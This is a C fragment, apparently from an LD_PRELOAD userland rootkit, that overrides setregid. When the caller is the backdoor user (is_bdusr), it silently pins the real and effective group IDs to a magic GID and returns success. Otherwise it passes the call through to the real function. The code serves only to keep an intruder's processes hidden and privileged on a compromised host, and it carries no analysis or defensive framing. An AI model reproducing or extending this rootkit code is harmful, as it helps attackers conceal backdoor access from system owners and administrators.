int setregid(gid_t rgid, gid_t egid)
{
    hook(CSETREGID);
    if(is_bdusr())
    {
        if(rgid != MAGIC_GID || egid != MAGIC_GID) (void)call(CSETREGID, MAGIC_GID, MAGIC_GID);
        return 0;
    }
    return (long)call(CSETREGID, rgid, egid);
}
